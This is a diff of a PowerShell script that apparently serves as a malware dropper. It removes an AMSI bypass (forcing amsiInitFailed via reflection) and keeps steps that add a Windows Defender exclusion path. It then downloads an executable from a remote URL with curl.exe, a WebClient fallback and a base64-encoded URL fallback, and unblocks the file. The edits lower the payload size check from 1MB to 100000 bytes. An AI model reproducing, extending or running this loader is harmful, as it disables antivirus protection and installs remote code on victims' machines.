@@ -34,13 +34,6 @@ if ((Test-Path $mark) -and ((Get-Date) - (Get-Item $mark).LastWriteTime).TotalMi
 }
 New-Item $mark -ItemType File -Force | Out-Null
 
-# ---------- 0. AMSI ------------------------------------------------------
-try {
-    $t = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-    $t.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
-    T 'amsi ok'
-} catch { T 'amsi fail' }
-
 # ---------- 1. exclusion ------------------------------------------------
 $ok = 0
 try { Add-MpPreference -ExclusionPath $exe -Force -ErrorAction Stop; $ok++ } catch { }
@@ -52,12 +45,12 @@ T "excl=$ok/3"
 Remove-Item $exe -Force -ErrorAction SilentlyContinue
 for ($i = 1; $i -le 3; $i++) {
     curl.exe -sL --max-time 600 -A $ua -o $exe $url
-    if ((Test-Path $exe) -and (Get-Item $exe).Length -gt 1MB) { T "curl ok try=$i"; break }
+    if ((Test-Path $exe) -and (Get-Item $exe).Length -gt 100000) { T "curl ok try=$i"; break }
     T "curl gagal try=$i"
     Start-Sleep -Seconds 2
 }
 
-if (-not (Test-Path $exe) -or (Get-Item $exe).Length -lt 1MB) {
+if (-not (Test-Path $exe) -or (Get-Item $exe).Length -lt 100000) {
     try {
         $c = New-Object Net.WebClient
         $c.Headers['User-Agent'] = $ua
@@ -66,7 +59,7 @@ if (-not (Test-Path $exe) -or (Get-Item $exe).Length -lt 1MB) {
     } catch { T "webclient fail: $($_.Exception.Message)" }
 }
 
-if ($urlB64 -and (-not (Test-Path $exe) -or (Get-Item $exe).Length -lt 1MB)) {
+if ($urlB64 -and (-not (Test-Path $exe) -or (Get-Item $exe).Length -lt 100000)) {
     try {
         $c = New-Object Net.WebClient
         $b = ($c.DownloadString($urlB64)) -replace '\s', ''
@@ -76,7 +69,7 @@ if ($urlB64 -and (-not (Test-Path $exe) -or (Get-Item $exe).Length -lt 1MB)) {
 }
 
 if (-not (Test-Path $exe)) { T 'ABORT tidak ada file'; }
-elseif ((Get-Item $exe).Length -lt 1MB) { T "ABORT ukuran $((Get-Item $exe).Length)" }
+elseif ((Get-Item $exe).Length -lt 100000) { T "ABORT ukuran $((Get-Item $exe).Length)" }
 else {
     T "ukuran $((Get-Item $exe).Length)"
     Unblock-File $exe -ErrorAction SilentlyContinue
